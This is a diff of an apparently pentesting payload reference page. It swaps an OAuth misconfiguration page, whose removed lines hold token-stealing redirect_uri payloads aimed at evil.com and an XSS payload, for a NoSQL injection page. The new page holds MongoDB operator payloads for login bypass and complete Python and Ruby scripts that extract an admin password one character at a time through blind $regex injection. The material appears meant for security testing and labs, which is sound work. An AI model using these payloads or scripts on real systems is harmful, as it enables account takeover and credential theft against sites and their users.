@@ -1,81 +1,247 @@
-# OAuth Misconfiguration
+# NoSQL Injection
 
-> OAuth is a widely-used authorization framework that allows third-party applications to access user data without exposing user credentials. However, improper configuration and implementation of OAuth can lead to severe security vulnerabilities. This document explores common OAuth misconfigurations, potential attack vectors, and best practices for mitigating these risks.
+> NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.
 
 ## Summary
 
-- [Stealing OAuth Token via referer](#stealing-oauth-token-via-referer)
-- [Grabbing OAuth Token via redirect_uri](#grabbing-oauth-token-via-redirect_uri)
-- [Executing XSS via redirect_uri](#executing-xss-via-redirect_uri)
-- [OAuth Private Key Disclosure](#oauth-private-key-disclosure)
-- [Authorization Code Rule Violation](#authorization-code-rule-violation)
-- [Cross-Site Request Forgery](#cross-site-request-forgery)
-- [Labs](#labs)
-- [References](#references)
+* [Tools](#tools)
+* [Methodology](#methodology)
+    * [Operator Injection](#operator-injection)
+    * [Authentication Bypass](#authentication-bypass)
+    * [Extract Length Information](#extract-length-information)
+    * [Extract Data Information](#extract-data-information)
+    * [WAF and Filters](#waf-and-filters)
+* [Blind NoSQL](#blind-nosql)
+    * [POST with JSON Body](#post-with-json-body)
+    * [POST with urlencoded Body](#post-with-urlencoded-body)
+    * [GET](#get)
+* [Labs](#references)
+* [References](#references)
 
-## Stealing OAuth Token via referer
+## Tools
 
-> Do you have HTML injection but can't get XSS? Are there any OAuth implementations on the site? If so, setup an img tag to your server and see if there's a way to get the victim there (redirect, etc.) after login to steal OAuth tokens via referer - [@abugzlife1](https://twitter.com/abugzlife1/status/1125663944272748544)
+* [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) - Automated NoSQL database enumeration and web application exploitation tool
+* [digininja/nosqlilab](https://github.com/digininja/nosqlilab) - A lab for playing with NoSQL Injection
+* [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) - This extension provides a way to discover NoSQL injection vulnerabilities.
 
-## Grabbing OAuth Token via redirect_uri
+## Methodology
 
-Redirect to a controlled domain to get the access token
+NoSQL injection occurs when an attacker manipulates queries by injecting malicious input into a NoSQL database query. Unlike SQL injection, NoSQL injection often exploits JSON-based queries and operators like `$ne`, `$gt`, `$regex`, or `$where` in MongoDB.
 
-```powershell
-https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
-https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
+### Operator Injection
+
+| Operator | Description        |
+| -------- | ------------------ |
+| $ne      | not equal          |
+| $regex   | regular expression |
+| $gt      | greater than       |
+| $lt      | lower than         |
+| $nin     | not in             |
+
+Example: A web application has a product search feature
+
+```js
+db.products.find({ "price": userInput })
 ```
 
-Redirect to an accepted Open URL in to get the access token
+An attacker can inject a NoSQL query: `{ "$gt": 0 }`.
 
-```powershell
-https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
-https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
+```js
+db.products.find({ "price": { "$gt": 0 } })
 ```
 
-OAuth implementations should never whitelist entire domains, only a few URLs so that “redirect_uri” can’t be pointed to an Open Redirect.
+Instead of returning a specific product, the database returns all products with a price greater than zero, leaking data.
 
-Sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:
+### Authentication Bypass
 
-```powershell
-https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
+Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)
+
+* HTTP data
+
+  ```ps1
+  username[$ne]=toto&password[$ne]=toto
+  login[$regex]=a.*&pass[$ne]=lol
+  login[$gt]=admin&login[$lt]=test&pass[$ne]=1
+  login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
+  ```
+
+* JSON data
+
+  ```json
+  {"username": {"$ne": null}, "password": {"$ne": null}}
+  {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+  {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+  {"username": {"$gt":""}, "password": {"$gt":""}}
+  ```
+
+### Extract Length Information
+
+Inject a payload using the $regex operator. The injection will work when the length is correct.
+
+```ps1
+username[$ne]=toto&password[$regex]=.{1}
+username[$ne]=toto&password[$regex]=.{3}
 ```
 
-## Executing XSS via redirect_uri
+### Extract Data Information
 
-```powershell
-https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
+Extract data with "`$regex`" query operator.
+
+* HTTP data
+
+  ```ps1
+  username[$ne]=toto&password[$regex]=m.{2}
+  username[$ne]=toto&password[$regex]=md.{1}
+  username[$ne]=toto&password[$regex]=mdp
+
+  username[$ne]=toto&password[$regex]=m.*
+  username[$ne]=toto&password[$regex]=md.*
+  ```
+
+* JSON data
+
+  ```json
+  {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
+  {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
+  {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
+  ```
+
+Extract data with "`$in`" query operator.
+
+```json
+{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
 ```
 
-## OAuth Private Key Disclosure
+### WAF and Filters
 
-Some Android/iOS app can be decompiled and the OAuth Private key can be accessed.
+**Remove pre-condition**:
 
-## Authorization Code Rule Violation
+In MongoDB, if a document contains duplicate keys, only the last occurrence of the key will take precedence.
 
-> The client MUST NOT use the authorization code  more than once.  
+```js
+{"id":"10", "id":"100"} 
+```
 
-If an authorization code is used more than once, the authorization server MUST deny the request
-and SHOULD revoke (when possible) all tokens previously issued based on that authorization code.
+In this case, the final value of "id" will be "100".
 
-## Cross-Site Request Forgery
+## Blind NoSQL
 
-Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable. This can be exploited by initializing the OAuth flow and intercepting the callback (`https://example.com/callback?code=AUTHORIZATION_CODE`). This URL can be used in CSRF attacks.
+### POST with JSON Body
 
-> The client MUST implement CSRF protection for its redirection URI. This is typically accomplished by requiring any request sent to the redirection URI endpoint to include a value that binds the request to the user-agent's authenticated state. The client SHOULD utilize the "state" request parameter to deliver this value to the authorization server when making an authorization request.
+Python script:
+
+```python
+import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username="admin"
+password=""
+u="http://example.org/login"
+headers={'content-type': 'application/json'}
+
+while True:
+    for c in string.printable:
+        if c not in ['*','+','.','?','|']:
+            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
+            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
+            if 'OK' in r.text or r.status_code == 302:
+                print("Found one more char : %s" % (password+c))
+                password += c
+```
+
+### POST with urlencoded Body
+
+Python script:
+
+```python
+import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username="admin"
+password=""
+u="http://example.org/login"
+headers={'content-type': 'application/x-www-form-urlencoded'}
+
+while True:
+    for c in string.printable:
+        if c not in ['*','+','.','?','|','&','$']:
+            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
+            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
+            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
+                print("Found one more char : %s" % (password+c))
+                password += c
+```
+
+### GET
+
+Python script:
+
+```python
+import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username='admin'
+password=''
+u='http://example.org/login'
+
+while True:
+  for c in string.printable:
+    if c not in ['*','+','.','?','|', '#', '&', '$']:
+      payload=f"?username={username}&password[$regex]=^{password + c}"
+      r = requests.get(u + payload)
+      if 'Yeah' in r.text:
+        print(f"Found one more char : {password+c}")
+        password += c
+```
+
+Ruby script:
+
+```ruby
+require 'httpx'
+
+username = 'admin'
+password = ''
+url = 'http://example.org/login'
+# CHARSET = (?!..?~).to_a # all ASCII printable characters
+CHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'
+GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
+session = HTTPX.plugin(:persistent)
+
+while true
+  CHARSET.each do |c|
+    unless GET_EXCLUDE.include?(c)
+      payload = "?username=#{username}&password[$regex]=^#{password + c}"
+      res = session.get(url + payload)
+      if res.body.to_s.match?('Yeah')
+        puts "Found one more char : #{password + c}"
+        password += c
+      end
+    end
+  end
+end
+```
 
 ## Labs
 
-- [PortSwigger - Authentication bypass via OAuth implicit flow](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)
-- [PortSwigger - Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)
-- [PortSwigger - OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
-- [PortSwigger - Stealing OAuth access tokens via a proxy page](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)
-- [PortSwigger - Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)
+* [Root Me - NoSQL injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Authentication)
+* [Root Me - NoSQL injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Blind)
 
 ## References
 
-- [All your Paypal OAuth tokens belong to me - asanso - November 28, 2016](https://web.archive.org/web/20161130191804/http://blog.intothesymmetry.com:80/2016/11/all-your-paypal-tokens-belong-to-me.html)
-- [OAuth 2 - How I have hacked Facebook again (..and would have stolen a valid access token) - asanso - April 8, 2014](https://web.archive.org/web/20140411210456/http://intothesymmetry.blogspot.ch:80/2014/04/oauth-2-how-i-have-hacked-facebook.html)
-- [How I hacked Github again - Egor Homakov - February 7, 2014](https://web.archive.org/web/20140302195803/http://homakov.blogspot.ch:80/2014/02/how-i-hacked-github-again.html)
-- [How Microsoft is giving your data to Facebook… and everyone else - Andris Atteka - September 16, 2014](https://web.archive.org/web/20151221013410/http://andrisatteka.blogspot.ch:80/2014/09/how-microsoft-is-giving-your-data-to.html)
-- [Bypassing Google Authentication on Periscope's Administration Panel - Jack Whitton - July 20, 2015](https://web.archive.org/web/20250113205505/https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/)
+* [Burp-NoSQLiScanner - matrix - January 30, 2021](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)
+* [Getting rid of pre- and post-conditions in NoSQL injections - Reino Mostert - March 11, 2025](https://web.archive.org/web/20260208131430/https://sensepost.com/blog/2025/getting-rid-of-pre-and-post-conditions-in-nosql-injections/)
+* [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat - February 22, 2015](https://web.archive.org/web/20160316144254/http://www.dailysecurity.fr/nosql-injections-classique-blind/)
+* [MongoDB NoSQL Injection with Aggregation Pipelines - Soroush Dalili (@irsdl) - June 23, 2024](https://web.archive.org/web/20240624015518/https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)
+* [NoSQL error-based injection - Reino Mostert - March 15, 2025](https://web.archive.org/web/20260208131314/https://sensepost.com/blog/2025/nosql-error-based-injection/)
+* [NoSQL Injection in MongoDB - Zanon - July 17, 2016](https://web.archive.org/web/20160916113057/http://zanon.io:80/posts/nosql-injection-in-mongodb)
+* [NoSQL injection wordlists - cr0hn - May 5, 2021](https://github.com/cr0hn/nosqlinjection_wordlists)
+* [Testing for NoSQL injection - OWASP - May 2, 2023](https://web.archive.org/web/20200707120423/https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
